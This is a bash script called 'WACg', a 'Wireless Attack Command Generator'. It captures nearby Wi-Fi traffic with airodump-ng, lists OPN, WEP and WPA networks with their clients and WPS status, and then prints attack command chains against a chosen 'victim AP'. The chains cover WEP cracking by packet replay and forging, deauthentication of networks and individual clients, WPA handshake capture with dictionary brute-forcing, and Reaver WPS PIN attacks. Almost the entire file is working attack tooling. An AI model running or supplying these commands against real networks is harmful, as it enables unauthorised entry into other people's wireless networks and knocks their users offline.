#!/bin/sh

time=
interface=

while getopts ":i:t:" OPTIONS
do
            case $OPTIONS in
            i)     interface=$OPTARG;;
            t)     time=$OPTARG;;
            ?)     printf "Invalid option: -$OPTARG\n" $0
                          exit 2;;
           esac
done

interface=${interface:=NULL}
time=${time:=NULL}

#Color codes
red=$(tput setaf 1)
yellow=$(tput setaf 3)
bold=$(tput bold)
endcol=$(tput sgr0)

##################
#  ~~~ Menu ~~~  #
##################

if [ $interface = NULL ] || [ $time = NULL ]; then

echo "--------------------------------------------------------------------"
echo "|                        WACg v2.0 ~ b33f                          |"
echo "|               -Wireless Attack Command Generator-                |"
echo "|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|"
echo "|  The power of wireless hacking harnessed through the black arts  |"
echo "|              of incomprehensible bash programming!!              |"
echo "|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|"
echo "| USAGE: ./WACg.sh -i [interface] -t [seconds]                     |"
echo "|                                                                  |"
echo "| REQUIRED                                                         |"
echo "|        -i  Device set to monitor mode.                           |"
echo "|        -t  The number of seconds to capture wireless data over   |"
echo "|            the monitor interface.                                |"
echo "--------------------------------------------------------------------"

else

#################################
#  ~~~ Fase 1: Enumeration ~~~  #
#################################

#Create program folder & PID
#################################################################################
rm -r /tmp/WACg &>/dev/null
mkdir /tmp/WACg

pidfile="/tmp/WACg/airo.pid"

#Run & kill capture on a timer
#################################################################################
capture="/usr/local/sbin/airodump-ng -w /tmp/WACg/capture $interface"
$capture &>/dev/null &
PID=$!
echo $PID > "$pidfile" &

echo "[>] Initialising Packet Capture"
countdown() {
  IFS=:
  set -- $*
  secs=$(( ${1#0} ))
  while [ $secs -gt 0 ]
  do
    sleep 1 &
    printf "\r[*] Time remaining - $red%02d:%02d:%02d$endcol" $((secs/3600)) $(( (secs/60)%60)) $((secs%60))
    secs=$(( $secs - 1 ))
    wait
  done
}

countdown "$time" & sleep $time && printf "\n[>] Done!!\n" &&

for pidkill in $(cat $pidfile); do  #
(kill -9 $pidkill 2>/dev/null) &    # Dirty but supresses kill output
wait $pidkill 2>/dev/null           #
done

#Split up capture in OPN,WEP,WPA/WPA2,Clients and clean up
#AP Fields: BSSID,channel,Privacy,Cipher,beacons,IV,ESSID
#Client Fields: Station MAC,Power,packets,BSSID,Probed ESSIDs
#Add flags to AP's for Clients and WPS
#################################################################################

#OPN
cat /tmp/WACg/capture-01.csv |tr -d " " |grep -a OPN |cut -d"," -f 1,4,6-7,10-11,14 |sed 's/$/,/' >> /tmp/WACg/AP-OPN.txt
#WEP
cat /tmp/WACg/capture-01.csv |tr -d " " |grep -a WEP |cut -d"," -f 1,4,6-7,10-11,14 |sed 's/$/,/' >> /tmp/WACg/AP-WEP.txt
#WPA/WPA2
cat /tmp/WACg/capture-01.csv |tr -d " " |grep -a WPA |cut -d"," -f 1,4,6-7,10-11,14 |sed 's/$/,/' >> /tmp/WACg/AP-WPA.txt

#Associated Client List
cat /tmp/WACg/capture-01.kismet.netxml |grep "<client-mac>" |cut -d">" -f2 |cut -d"<" -f1 >> /tmp/WACg/client-tmp.txt
for client in $(cat /tmp/WACg/client-tmp.txt); do
cat /tmp/WACg/capture-01.csv |grep -a $client >> /tmp/WACg/clients-tmp.txt
done
cat /tmp/WACg/clients-tmp.txt |tr -d " " |cut -d"," -f1,4-7 >> /tmp/WACg/clients.txt

#Set client flag for AP's (Y/N)
for cliY in $(cat /tmp/WACg/clients.txt |cut -d"," -f4 |uniq); do
sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-OPN.txt
sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-WEP.txt
sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
done
for cliN in $(cat /tmp/WACg/AP-*.txt |cut -d"," -f1-8 |egrep -a -v "Yes" |cut -d"," -f1); do
sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-OPN.txt
sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-WEP.txt
sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
done

#Set WPA WPS flag for reaver (Y/N)
wash -f /tmp/WACg/capture-*.cap -C >> /tmp/WACg/wps_tmp.txt 2>/dev/null
cat /tmp/WACg/wps_tmp.txt |grep ":" |tr ' ' ',' |sed 's/,,,,,,/,/g' |sed 's/,,,,,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' >> /tmp/WACg/wps.txt
sed -i 's/$/,/' /tmp/WACg/AP-WPA.txt
for wpsY in $(cat /tmp/WACg/wps.txt |cut -d"," -f1); do
sed -i "/^$wpsY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
done
for wpsN in $(cat /tmp/WACg/AP-WPA.txt |cut -d"," -f1-7,9 |egrep -a -v "Yes" |cut -d"," -f1); do
sed -i "/^$wpsN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
done

#Garbage routine
rm /tmp/WACg/client-tmp.txt &>/dev/null
rm /tmp/WACg/clients-tmp.txt &>/dev/null
rm /tmp/WACg/capture-* &>/dev/null
rm /tmp/WACg/wps_tmp.txt &>/dev/null

#############################################
#  ~~~ Fase 2: Menu & Attack Generator ~~~  #
#############################################

while :
do
   clear

#Display menu
echo "--------------------------------------------------"
echo "|     '|| '||'  '|'  |      ..|'''.|             |"
echo "|      '|. '|.  .'  |||   .|'     '   ... .      |"
echo "|       ||  ||  |  |  ||  ||         || ||       |"
echo "|        ||| |||  .''''|. '|.      .  |''        |"
echo "|         |   |  .|.  .||. ''|....'  '||||.      |"
echo "|                                   .|....'      |"
echo "|------------------------------------------------|"
echo "|      -Wireless Attack Command Generator-       |"
echo "|------------------------------------------------|"
echo "| 1.$yellow Summary                                     $endcol|"
echo "| 2.$yellow OPN-Summary                                 $endcol|"
echo "| 3.$yellow WEP-Suite                                   $endcol|"
echo "| 4.$yellow WPA-Suite                                   $endcol|"
echo "| 5.$yellow Exit                                        $endcol|"
echo "--------------------------------------------------"

#Get input
read -p "Choice (1-5): " choice

#Some pre-defined wireless attack function variables
#################################################################################
local=$(macchanger -s $interface |cut -d" " -f3)
speed=$(echo 150) #Default packet injection speed
save=$(echo $RANDOM)

#Menu functions

#Summary
#################################################################################
f_summary () {
echo ""
sumOPN=$(wc -l /tmp/WACg/AP-OPN.txt |cut -d" " -f1)
echo "OPN networks: $sumOPN"
sumWEP=$(wc -l /tmp/WACg/AP-WEP.txt |cut -d" " -f1)
echo "WEP networks: $sumWEP"
sumWPA=$(wc -l /tmp/WACg/AP-WPA.txt |cut -d" " -f1)
echo "WPA networks: $sumWPA"
sumCli=$(wc -l /tmp/WACg/clients.txt |cut -d" " -f1)
echo "Associated Clients: $sumCli"
echo ""
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey
}

#OPN networks summary
#################################################################################
f_opn () {
echo ""
echo "Available OPN-Networks:"
echo ""
echo "[${red}If ESSID is empty the network is hidden!${endcol}]"
echo ""
cat /tmp/WACg/AP-OPN.txt |awk -F, '{print "BSSID: "$1 "\tChannel: " $2 "\tClients: " $8 "\tESSID: " $7}'
echo ""
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey
}

#WEP menu
#################################################################################
f_wep () {

#Display Networks
echo ""
echo "Available WEP-Networks:"
echo ""
echo "[${red}If ESSID is empty the network is hidden!${endcol}]"
echo ""
cat /tmp/WACg/AP-WEP.txt |awk -F, '{print "BSSID: "$1 "\tChannel: " $2 "\tIV: " $6 "\tClients: " $8 "\tESSID: " $7}'
echo ""

#Offer choice
echo "${red}[>]${endcol} Initiate (${red}A${endcol})ttack generator or (${red}R${endcol})eturn to main menu"
echo -n "Choice (A/R): "
read -e WEP_ARG

if [ "$WEP_ARG" = A ]; then

echo ""
echo "${red}[>]${endcol} Select victim AP MAC address"
echo -n "MAC: "
read -e remote
chan=$(grep -a $remote /tmp/WACg/AP-*.txt |cut -d"," -f2)

echo ""
echo "--------------------------------------------------"
echo "| [>] Select appropirate attack vector:          |"
echo "|                                                |"
echo "| 1.$yellow Standard ARP-request replay                 $endcol|"
echo "| 2.$yellow Interactive frame selection                 $endcol|"
echo "| 3.$yellow Decrypt/chopchop WEP packet                 $endcol|"
echo "| 4.$yellow Generates valid keystream                   $endcol|"
echo "| 5.$yellow Use previously generated *.xor              $endcol|"
echo "| 6.$yellow Deauth entire network [needs client(s)]     $endcol|"
echo "| 7.$yellow Deauth specific client(s) [needs client(s)] $endcol|"
echo "--------------------------------------------------"
echo -n "Choice (1-7): "
read -e WEP_VAR

if [ "$WEP_VAR" = 1 ]; then

echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
echo "aireplay-ng -1 4 -o 1 -q 2 -a $remote -h $local $interface"
echo "aireplay-ng -3 -x $speed -b $remote -h $local $interface"
echo "aircrack-ng -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 2 ]; then

echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
echo "aireplay-ng -1 4 -o 1 -q 2 -a $remote -h $local $interface"
echo "aireplay-ng -2 -x $speed -p 0841 -c FF:FF:FF:FF:FF:FF -b $remote -h $local $interface"
echo "aircrack-ng -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 3 ]; then

echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
echo "aireplay-ng -1 4 -o 1 -q 2 -a $remote -h $local $interface"
echo "aireplay-ng -4 -x $speed -b $remote -h $local $interface"
echo "aircrack-ng -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 4 ]; then

echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
echo "aireplay-ng -1 4 -o 1 -q 2 -a $remote -h $local $interface"
echo "aireplay-ng -5 -x $speed -b $remote -h $local $interface"
echo "aircrack-ng -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 5 ]; then

echo ""
echo "[${red}If nessesary: airodump-ng -c (channel) --bssid (MAC) -w (file) Monitor_Interface${endcol}]"
echo ""
echo -n "Full filepath of *.xor: "
read -e arp
echo "${bold}"
echo "packetforge-ng -0 -a $remote -h $local -k 225.225.225.225 -l 225.225.225.225 -y $arp -w arpreq"
echo "aireplay-ng -2 -x $speed -r arpreq $interface"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 6 ]; then

echo ""
echo "[${red}You will most likely want to combine this with another attack..${endcol}]"
echo "${bold}"
echo "aireplay-ng -0 10 -a $remote $interface"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WEP_VAR" = 7 ]; then

echo ""
echo "[${red}You will most likely want to combine this with another attack..${endcol}]"
echo ""
echo "Client(s) to deauth:"
echo "${bold}"
for WEPdeauth in $(cat /tmp/WACg/clients.txt |grep $remote |cut -d"," -f1); do
echo "aireplay-ng -0 10 -a $remote -c $WEPdeauth $interface"
done
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey
fi

elif [ "$WEP_ARG" = R ]; then
echo ""
fi
}

#WPA menu
#################################################################################
f_wpa () {

#Display Networks
echo ""
echo "Available WPA-Networks:"
echo ""
echo "[${red}If ESSID is empty the network is hidden!${endcol}]"
echo ""
cat /tmp/WACg/AP-WPA.txt |awk -F, '{print "BSSID: " $1 "\tChannel: " $2 "\tClients: " $8  "\tWPS: " $9 "\tESSID: " $7}'
echo ""

#Offer choice
echo -e "${red}[>]${endcol} Initiate (${red}A${endcol})ttack generator or (${red}R${endcol})eturn to main menu"
echo -n "Choice (A/R): "
read -e WPA_ARG

if [ "$WPA_ARG" = A ]; then

echo ""
echo "${red}[>]${endcol} Select victim AP MAC address"
echo -n "MAC: "
read -e remote
chan=$(grep -a $remote /tmp/WACg/AP-*.txt |cut -d"," -f2)

echo ""
echo "--------------------------------------------------"
echo "| [>] Select appropirate attack vector:          |"
echo "|                                                |"
echo "| 1.$yellow PSK deauth whole network [needs client(s)]  $endcol|"
echo "| 2.$yellow PSK specific client(s) [needs client(s)]    $endcol|"
echo "| 3.$yellow Reaver WPS attack                           $endcol|"
echo "--------------------------------------------------"
echo -n "Choice (1-3): "
read -e WPA_VAR

if [ "$WPA_VAR" = 1 ]; then

echo ""
echo "[${red}Remember we will be running a brute-force attack..${endcol}]"
echo ""
echo -n "Full filepath of password list: "
read -e pwd
echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
echo "aireplay-ng -0 10 -a $remote $interface"
echo "aircrack-ng -w $pwd -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WPA_VAR" = 2 ]; then

echo ""
echo "[${red}Remember we will be running a brute-force attack..${endcol}]"
echo ""
echo -n "Full filepath of password list: "
read -e pwd
echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote -w $save $interface"
for WPAdeauth in $(cat /tmp/WACg/clients.txt |grep $remote |cut -d"," -f1); do
echo "aireplay-ng -0 10 -a $remote -c $WPAdeauth $interface"
done
echo "aircrack-ng -w $pwd -b $remote $save*.cap"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$WPA_VAR" = 3 ]; then

echo ""
echo "${red}[>]${endcol} Use (${red}R${endcol})eaver or (${red}A${endcol})ireplay-ng to associate with the target"
echo -n "Choice (R/A): "
read -e reaver

if [ "$reaver" = R ]; then

echo "${bold}"
echo "reaver -i $interface --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -c $chan -b $remote"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey

elif [ "$reaver" = A ]; then

echo "${bold}"
echo "airodump-ng -c $chan --bssid $remote $interface"
echo "aireplay-ng -1 4 -o 1 -q 2 -a $remote -h $local $interface"
echo "reaver -i $interface --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -A -b $remote"
echo "${endcol}"
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey
fi
fi

elif [ "$WPA_ARG" = R ]; then
echo ""
fi
}

#Exit function
#################################################################################
f_bye () {
echo ""
echo "Bye!"
exit 0
}

#Error function
#################################################################################
f_error () {
echo ""
echo "Error: Invalid option..."
echo ""
read -p "${red}[>]${endcol} Return to Main Menu press [${red}Enter${endcol}]..." readEnterKey
}

#Make decision using case..in..esac
case $choice in
1) f_summary ;;
2) f_opn ;;
3) f_wep ;;
4) f_wpa ;;
*) f_bye ;;
	esac

done

fi